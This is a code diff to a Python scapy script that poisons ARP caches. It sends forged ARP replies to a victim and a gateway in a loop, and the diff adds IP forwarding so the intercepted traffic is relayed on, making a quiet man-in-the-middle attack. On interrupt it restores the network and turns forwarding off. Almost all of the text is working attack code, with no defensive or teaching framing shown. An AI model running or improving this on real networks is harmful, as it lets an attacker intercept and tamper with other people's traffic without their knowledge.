@@ -1,6 +1,9 @@
 from scapy.all import *
 import time
+import os
+
 from utils.network_utils import get_mac_address, get_local_mac
+from utils.ip_forwarding import enable_ip_forwarding, disable_ip_forwarding
 
 def poison_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, interface):
     """
@@ -90,9 +93,12 @@ def run(args):
             return
 
     try:
+        enable_ip_forwarding()
         while True:
             poison_arp(args.victim_ip, args.victim_mac, args.gateway_ip, args.gateway_mac, args.attacker_mac, args.interface)
             time.sleep(2)
     except KeyboardInterrupt:
         print("Stopping ARP poisoning and restoring network...")
         restore_network(args.victim_ip, args.victim_mac, args.gateway_ip, args.gateway_mac, args.interface)
+        disable_ip_forwarding()
+
